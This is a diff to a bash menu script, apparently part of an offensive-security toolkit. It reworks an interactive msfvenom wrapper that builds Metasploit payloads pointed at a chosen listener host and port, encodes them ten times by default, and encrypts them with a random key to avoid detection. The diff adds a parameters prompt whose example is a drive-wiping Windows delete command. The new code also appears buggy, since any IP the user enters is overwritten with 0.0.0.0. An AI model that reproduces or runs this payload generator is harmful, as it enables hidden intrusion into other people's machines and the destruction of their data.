@@ -10566,44 +10566,50 @@ while true; do
 		read -p "(example, 192.168.1.1): " MIP
 		if [[ "$MIP" != "" ]];
 		then
-			echo "Digit your PORT"
-			read -p "(default 9001): " -i "9001" MPRT
-			if [[ "$MPRT" == "" ]];
-			then
-				MPRT="9001"
-			fi
-			echo "Choose a payload"
-			select PAY in $(msfvenom -l payloads | awk '{print $1}')
+			MIP="0.0.0.0"
+		fi
+		echo "Digit your PORT"
+		read -p "(default 9001): " -i "9001" MPRT
+		if [[ "$MPRT" == "" ]];
+		then
+			MPRT="9001"
+		fi
+		echo "Digit Paramters"
+		read -p "(example, CMD=\"del /f /s /q C:\\*.*\"): " PARAMS
+		if [[ "$PARAMS" == "" ]];
+		then
+			PARAMS=""
+		fi
+		echo "Choose a payload"
+		select PAY in $(msfvenom -l payloads | awk '{print $1}')
+		do
+			echo "Choose an architecture"
+			select ARC in $(msfvenom -l archs | awk '{print $1}')
 			do
-				echo "Choose an architecture"
-				select ARC in $(msfvenom -l archs | awk '{print $1}')
+				echo "Choose an encoder"
+				select ENC in $(msfvenom -l encoders | awk '{print $1}')
 				do
-					echo "Choose an encoder"
-					select ENC in $(msfvenom -l encoders | awk '{print $1}')
+					echo "Digit how many time encode the payload"
+					read -p "(default 10): " -i "10" ITE
+					if [[ "$ITE" == "" ]];
+					then
+						ITE="10"
+					fi
+					echo "Choose a file format"
+					select FORM in $(msfvenom -l formats | awk '{print $1}')
 					do
-						echo "Digit how many time encode the payload"
-						read -p "(default 10): " -i "10" ITE
-						if [[ "$ITE" == "" ]];
-						then
-							ITE="10"
-						fi
-						echo "Choose a file format"
-						select FORM in $(msfvenom -l formats | awk '{print $1}')
+						echo "Choose an algorithm of cryptography"
+						select CRYP in $(msfvenom -l encrypt | awk '{print $1}')
 						do
-							echo "Choose an algorithm of cryptography"
-							select CRYP in $(msfvenom -l encrypt | awk '{print $1}')
-							do
-								echo "Digit a passphare; if it be empty, it will be created pseudo-randomly"
-								read -p "(default is empty): " PSSP
-								if [[ "$PSSP" == "" ]];
-								then
-									PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 32)
-								fi
-								MIV=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16)
-								echo "Creating a payload encrypted with ""$PSSP"" passphrase and ""$MIV"" vector"
-								msfvenom -p "$PAY" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" --encrypt-iv "$MIV" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
-								break
-							done
+							echo "Digit a passphare; if it be empty, it will be created pseudo-randomly"
+							read -p "(default is empty): " PSSP
+							if [[ "$PSSP" == "" ]];
+							then
+								PSSP=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 32)
+							fi
+							MIV=$(head /dev/urandom | tr -dc 'A-Za-z0-9' | head -c 16)
+							echo "Creating a payload encrypted with ""$PSSP"" passphrase and ""$MIV"" vector"
+							msfvenom -p "$PAY" "$PARAMS" -a "$ARC" -e "$ENC" -i "$ITE" --encrypt "$CRYP" --encrypt-key "$PSSP" --encrypt-iv "$MIV" -f "$FORM" LHOST="$MIP" LPORT="$MPRT" -o payload.$FORM
 							break
 						done
 						break
@@ -10612,7 +10618,8 @@ while true; do
 				done
 				break
 			done
-		fi
+			break
+		done
 	;;
 	"2544")
 		Clona "EatonChips/wsh"
